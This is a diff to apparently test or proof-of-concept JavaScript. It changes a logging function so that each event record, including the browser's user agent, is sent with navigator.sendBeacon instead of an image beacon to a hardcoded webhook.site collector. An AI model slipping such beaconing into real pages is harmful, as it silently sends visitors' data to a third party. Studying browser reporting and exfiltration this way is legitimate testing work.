@@ -10,16 +10,32 @@ const HOOK = 'https://webhook.site/ecf90bba-d52e-4352-b2d5-3b81ce45a357';
 const output = document.querySelector('#output');
 const beacons = [];
 let started = false;
+
 function log(stage, data = {}) {
-  const record = {stage, data, ua: navigator.userAgent};
-  output.textContent += '\n' + JSON.stringify(record);
+  const record = {
+    stage,
+    data,
+    ua: navigator.userAgent
+  };
+
+  const payload = JSON.stringify(record);
+
+  output.textContent += "\n" + payload;
   console.log(record);
-  const image = new Image();
-  beacons.push(image);
-  image.src = HOOK + '?event=' + encodeURIComponent(stage) +
-    '&data=' + encodeURIComponent(JSON.stringify(record).slice(0, 1500)) +
-    '&t=' + Date.now() + Math.random().toString(36).slice(2);
+
+  const url =
+    HOOK +
+    "?event=" + encodeURIComponent(stage) +
+    "&t=" + Date.now();
+
+  const sent = navigator.sendBeacon(
+    url,
+    new Blob([payload], { type: "text/plain" })
+  );
+
+  console.log("Beacon queued:", stage, sent);
 }
+
 function start() {
   if (started) return;
   started = true;
